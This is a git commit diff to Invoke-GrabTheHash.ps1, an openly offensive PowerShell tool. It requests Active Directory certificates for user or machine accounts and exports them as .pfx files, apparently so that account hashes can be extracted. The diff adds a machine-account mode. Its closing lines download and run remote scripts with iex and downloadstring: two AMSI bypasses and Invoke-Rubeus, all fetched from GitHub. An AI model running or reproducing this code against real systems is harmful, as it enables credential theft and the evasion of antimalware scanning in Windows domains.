868863c88e1132f4922f9b754a2a5b760f3693b3
Rob <61951374+Leo4j@users.noreply.github.com>
2023-08-23 11:51:49 +0100

    Add files via upload

--- Invoke-GrabTheHash.ps1
+++ Invoke-GrabTheHash.ps1
@@ -21,6 +21,12 @@ Specify the Certificate Authority Name
 
 .PARAMETER CN
 Specify the Account Client Name
+
+.PARAMETER PFX
+Provide a previously obtained .pfx to get the account hash
+
+.PARAMETER Machine
+Work with Machine Accounts TGTs and Certificates (needs to run in elevated context)
 #>
 
 function Invoke-GrabTheHash
@@ -31,7 +37,7 @@ function Invoke-GrabTheHash
 		[Parameter(Mandatory=$False,ValueFromPipeline=$True,ValueFromPipelineByPropertyName=$True)]
 		[string]$CN,
 		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
-		[String]$TemplateName = "User",
+		[String]$TemplateName,
 		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
 		[string]$CAName,
 		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
@@ -39,13 +45,24 @@ function Invoke-GrabTheHash
 		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
 		[string]$PFX,
 		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
-		[switch]$CertTemplates
+		[switch]$CertTemplates,
+		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
+		[switch]$Machine
 	)
 	
 	$ErrorActionPreference = "SilentlyContinue"
 	$WarningPreference = "SilentlyContinue"
 	
 	Write-Host ""
+	
+	if($Machine){
+		$isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+		if($isAdmin){}
+		else{
+			Write-Host "[-] Not running on an elevated context. Working with Machine Certificates will fail." -ForegroundColor Yellow
+			Write-Host ""
+		}
+	}
 
  	if($Domain){
 		$currentDomain = $Domain
@@ -133,9 +150,17 @@ function Invoke-GrabTheHash
 	
 	if(!$CN){
 		$KlistDump = klist
-		$clientNames = $KlistDump | Where-Object { $_ -match "Client:\s*([\w.]+)\s*@" } | ForEach-Object { $matches[1] }
-		$CN = $clientNames | Sort -Unique
+		$clientLine = $KlistDump | Where-Object { $_ -like "*Client:*" }
+		$clientName = (($clientLine[0] -split 'Client: ')[1] -split ' @')[0].Trim()
+		$CN = $clientName
 	}
+	
+	if($Machine){
+		if($TemplateName){}
+		else{$TemplateName = "Machine"}
+	}
+	
+	else{$TemplateName = "User"}
 	
 	function Remove-ReqTempfiles()
 	{
@@ -143,7 +168,9 @@ function Invoke-GrabTheHash
 			[String[]]$tempfiles
 		)
 		
-		$certstore = new-object system.security.cryptography.x509certificates.x509Store('REQUEST', 'CurrentUser')
+		if($Machine){$certstore = new-object system.security.cryptography.x509certificates.x509Store('REQUEST', 'LocalMachine')}
+		else{$certstore = new-object system.security.cryptography.x509certificates.x509Store('REQUEST', 'CurrentUser')}
+		
 		$certstore.Open('ReadWrite')
 		foreach($certreq in $($certstore.Certificates))
 		{
@@ -157,11 +184,24 @@ function Invoke-GrabTheHash
 		foreach($file in $tempfiles){remove-item ".\$file" -ErrorAction silentlycontinue}
 	}
 
-	if($PSBoundParameters['Debug']){$DebugPreference = "Continue"}
-	
 	Write-Host "[+] Requesting certificate with subject $CN"
  	Write-Host ""
 	
+	if($Machine){
+	$file = @"
+[NewRequest]
+Subject = "CN=$CN,c=$Country, s=$State, l=$City, o=$Organisation, ou=$Department"
+MachineKeySet = TRUE
+KeyLength = 2048
+KeySpec=1
+Exportable = TRUE
+RequestType = PKCS10
+[RequestAttributes]
+CertificateTemplate = "$TemplateName"
+"@
+}
+	
+	else{
 	$file = @"
 [NewRequest]
 Subject = "CN=$CN"
@@ -172,81 +212,88 @@ RequestType = PKCS10
 [RequestAttributes]
 CertificateTemplate = "$TemplateName"
 "@
+}
 
 	Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
 	Set-Content .\certreq.inf $file
 	Get-Content .\certreq.inf | Write-Verbose
 
-	try {
-		Invoke-Expression -Command "certreq -new -q certreq.inf certreq.req" >$null 2>&1
-		if(!($LastExitCode -eq 0))
-		{
-			Write-Host "Certificate request failed"
-			Write-Host ""
-			break
-		}
-
-		if($CAName){	
-			Invoke-Expression -Command "certreq -submit -q -config `"$CAName`" certreq.req $CN.cer" >$null 2>&1
-		}
-		else{
-			$success = $false
-			foreach($CAName in $caNames){
-				try{
-					Invoke-Expression -Command "certreq -submit -q -config `"$CAName`" certreq.req $CN.cer" >$null 2>&1
-					if($LASTEXITCODE -eq 0) {
-						$success = $true
-						break
-					}
-				}
-				catch{continue}
-			}
-			
-			if(-not $success){
-				Invoke-Expression -Command "certreq -submit certreq.req $CN.cer" >$null 2>&1
-			}
-		}
-		
-		if(!($LastExitCode -eq 0))
-		{
-			Write-Host "certreq -submit command failed"
-		}
-
-		Invoke-Expression -Command "certreq -accept -q $CN.cer" >$null 2>&1
-
-		if(!($LastExitCode -eq 0))
-		{
-			Write-Host "certreq -accept command failed"
-		}
-
-		if(($LastExitCode -eq 0) -and ($? -eq $true))
-		{}
-		
-		else
-		{
-			Write-Host "Request failed with unkown error"
-		}
-
-		$cert = Get-Childitem "cert:\CurrentUser\My" | where-object {$_.Thumbprint -eq (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2((Get-Item "$CN.cer").FullName,"")).Thumbprint}
-
-		$certbytes = $cert.export([System.Security.Cryptography.X509Certificates.X509ContentType]::pfx)
-
-		$certbytes | Set-Content -Encoding Byte -Path "$CN.pfx" -ea Stop
-		Write-Host "[+] Certificate successfully exported to $CN.pfx"
-  		Write-Host ""
-		
-		$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'CurrentUser')
-		$certstore.Open('ReadWrite')
-		$certstore.Remove($cert)
-		$certstore.close() 
-	}
-	catch {
-		Write-Error $_
-	}
-	finally {
+	Invoke-Expression -Command "certreq -new -q certreq.inf certreq.req" >$null 2>&1
+	if(!($LastExitCode -eq 0))
+	{
+		Write-Host "[-] Certificate request failed"
+		Write-Host ""
 		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
+		break
+	}
+
+	if($CAName){	
+		Invoke-Expression -Command "certreq -submit -q -config `"$CAName`" certreq.req $CN.cer" >$null 2>&1
+	}
+	else{
+		$success = $false
+		foreach($CAName in $caNames){
+			try{
+				Invoke-Expression -Command "certreq -submit -q -config `"$CAName`" certreq.req $CN.cer" >$null 2>&1
+				if($LASTEXITCODE -eq 0) {
+					$success = $true
+					break
+				}
+			}
+			catch{continue}
+		}
+		
+		if(-not $success){
+			Invoke-Expression -Command "certreq -submit certreq.req $CN.cer" >$null 2>&1
+		}
 	}
 	
+	if(!($LastExitCode -eq 0))
+	{
+		Write-Host "[-] Certificate request failed"
+		Write-Host ""
+		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
+		break
+	}
+
+	Invoke-Expression -Command "certreq -accept -q $CN.cer" >$null 2>&1
+
+	if(!($LastExitCode -eq 0))
+	{
+		Write-Host "[-] Certificate request failed"
+		Write-Host ""
+		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
+		break
+	}
+
+	if(($LastExitCode -eq 0) -and ($? -eq $true))
+	{}
+	
+	else
+	{
+		Write-Host "[-] Certificate request failed"
+		Write-Host ""
+		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
+		break
+	}
+	
+	if($Machine){$cert = Get-Childitem "cert:\LocalMachine\My" | where-object {$_.Thumbprint -eq (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2((Get-Item "$CN.cer").FullName,"")).Thumbprint}}
+	else{$cert = Get-Childitem "cert:\CurrentUser\My" | where-object {$_.Thumbprint -eq (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2((Get-Item "$CN.cer").FullName,"")).Thumbprint}}
+
+	$certbytes = $cert.export([System.Security.Cryptography.X509Certificates.X509ContentType]::pfx)
+
+	$certbytes | Set-Content -Encoding Byte -Path "$CN.pfx" -ea Stop
+	Write-Host "[+] Certificate successfully exported to $CN.pfx"
+	Write-Host ""
+	
+	if($Machine){$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'LocalMachine')}
+	else{$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'CurrentUser')}
+	$certstore.Open('ReadWrite')
+	$certstore.Remove($cert)
+	$certstore.close()
+	
+	Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
+		
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
